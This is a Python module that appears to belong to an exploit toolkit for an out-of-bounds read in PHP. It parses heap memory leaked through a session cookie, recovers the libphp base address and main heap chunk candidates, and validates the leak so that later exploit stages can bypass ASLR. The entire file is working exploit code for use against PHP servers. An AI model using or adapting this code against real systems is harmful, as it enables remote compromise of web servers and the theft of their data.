"""Leak parser for the ArchonX OOB read.

Extracts heap pointers from the Set-Cookie header in the B1 response. The
stale session ID points to a fake zend_string with a large len field,
causing php_url_encode to read far past the legitimate string boundary.

The URL-encoded cookie value contains raw heap memory including:
  - chunk-internal pointers (2 MiB-aligned clusters)
  - libphp pointers (zval_ptr_dtor from real HashTable pDestructor fields)
  - main chunk pointers

Architecture detection: x86_64 pointers live in 0x7f0000000000..0x7fffffffffff,
aarch64 pointers in 0xffff00000000..0xffffffffffff or 0xaaaa00000000..0xaaaafffffeff.
"""
from __future__ import annotations

import struct
import urllib.parse
from collections import Counter
from dataclasses import dataclass, field

from .branding import log


DEFAULT_MAIN_BUCKET_COUNT = 87


@dataclass
class LeakResult:
    decoded_len: int = 0
    arch: str = ""
    zval_ptr_dtor_addr: int = 0
    zval_ptr_dtor_count: int = 0
    libphp_base: int = 0
    main_chunk_candidates: list = field(default_factory=list)
    buckets: dict = field(default_factory=dict)
    all_pointers: int = 0
    raw_decoded: bytes = b""


def _is_heap_pointer(q: int) -> bool:
    if q <= 0x10000 or q >= 0x0001000000000000:
        return False
    if q in (0x4141414141414141, 0x4242424242424242,
             0x5353535353535353, 0x5555555555555555):
        return False
    if q < 0x400000000000:
        return False
    return True


def _detect_arch(counts: Counter) -> str:
    x86 = sum(c for q, c in counts.items()
              if 0x7f0000000000 <= q <= 0x7fffffffffff)
    arm_high = sum(c for q, c in counts.items()
                   if 0xffff00000000 <= q <= 0xffffffffffff)
    arm_low = sum(c for q, c in counts.items()
                  if 0xaaaa00000000 <= q <= 0xaaaafffffeff)
    arm = arm_high + arm_low
    if x86 > arm:
        return "x86_64"
    if arm > x86:
        return "aarch64"
    return "unknown"


def extract_cookie(resp: bytes) -> bytes:
    marker = b"Set-Cookie: PHPSESSID="
    i = resp.find(marker)
    if i < 0:
        raise RuntimeError(
            f"no Set-Cookie in leak response ({len(resp)}B)"
        )
    val = resp[i + len(marker):].split(b"\r\n")[0].split(b";")[0]
    # PHP url_encode converts 0x20 to '+'; Python's unquote_to_bytes does
    # not undo that, so restore %20 first (corrupts ARM64 pointers otherwise).
    val = val.replace(b"+", b"%20")
    decoded = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    log.debug(f"cookie extracted: {len(val)}B raw → {len(decoded)}B decoded")
    return decoded


def parse_leak(resp: bytes, dtor_offset: int,
               main_bucket_count: int = DEFAULT_MAIN_BUCKET_COUNT
               ) -> LeakResult:
    decoded = extract_cookie(resp)
    result = LeakResult(decoded_len=len(decoded), raw_decoded=decoded)

    counts: Counter = Counter()
    for off in range(0, len(decoded) - 8, 8):
        q = struct.unpack_from("<Q", decoded, off)[0]
        if _is_heap_pointer(q):
            counts[q] += 1

    if not counts:
        raise RuntimeError("no heap pointers in leak window")

    result.all_pointers = sum(counts.values())
    result.arch = _detect_arch(counts)
    log.debug(f"pointer scan: {result.all_pointers} hits "
              f"/ {len(decoded) // 8} slots")

    zdtor, n = counts.most_common(1)[0]
    result.zval_ptr_dtor_addr = zdtor
    result.zval_ptr_dtor_count = n
    result.libphp_base = zdtor - dtor_offset

    buckets: Counter = Counter()
    for q, c in counts.items():
        b = q & ~0x1FFFFF
        buckets[b] += c
    result.buckets = dict(buckets.most_common())

    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    candidates = [(b, c) for b, c in buckets.most_common()
                  if b not in (lib_bucket, id_bucket)]
    candidates.sort(key=lambda bc: (abs(bc[1] - main_bucket_count), bc[1]))
    result.main_chunk_candidates = [b for b, _ in candidates[:5]]

    log.debug(f"zval_ptr_dtor={zdtor:#x} x{n}")
    log.debug(f"libphp_base={result.libphp_base:#x}")
    log.debug(f"top buckets: "
              f"{[(hex(b), c) for b, c in buckets.most_common(6)]}")
    return result


def validate_leak(result: LeakResult, delta_min: int = 0x100000,
                  delta_max: int = 0xC000000) -> tuple[bool, str]:
    if not result.main_chunk_candidates:
        return False, "no main-chunk candidate found"

    main = result.main_chunk_candidates[0]
    delta = abs(result.libphp_base - main)
    if not (delta_min <= delta <= delta_max):
        return False, (
            f"implausible libphp-main delta {delta:#x} "
            f"(expected {delta_min:#x}-{delta_max:#x})"
        )

    misalign = result.libphp_base & 0xFFF
    if misalign != 0:
        return False, (
            f"libphp base {result.libphp_base:#x} not page-aligned "
            f"(off by {misalign:#x})"
        )

    return True, "ok"
